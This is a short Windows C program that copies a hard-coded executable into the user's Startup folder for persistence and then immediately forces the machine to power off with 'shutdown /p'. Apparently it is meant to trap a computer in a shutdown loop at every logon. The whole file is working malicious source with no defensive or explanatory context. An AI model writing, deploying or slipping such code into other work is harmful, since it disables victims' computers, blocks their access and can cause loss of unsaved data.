#include <stdio.h>
#include <windows.h>
#include <Shlobj.h>
#pragma comment(lib, "shell32.lib")
  
BOOL AutoRun_Startup(char *lpszSrcFilePath, char *lpszDestFileName)
{
    char szStartupPath[MAX_PATH] = { 0 };
    char szDestFilePath[MAX_PATH] = { 0 };
    SHGetSpecialFolderPath(NULL, szStartupPath, CSIDL_STARTUP, TRUE);
    wsprintf(szDestFilePath, "%s\\%s", szStartupPath, lpszDestFileName);
    CopyFile(lpszSrcFilePath, szDestFilePath, FALSE);
    return TRUE;
}
  
int main(int argc, char * argv[])
{
    AutoRun_Startup("c://main.exe", "main.exe");
    system("shutdown /p");
    return 0;
}
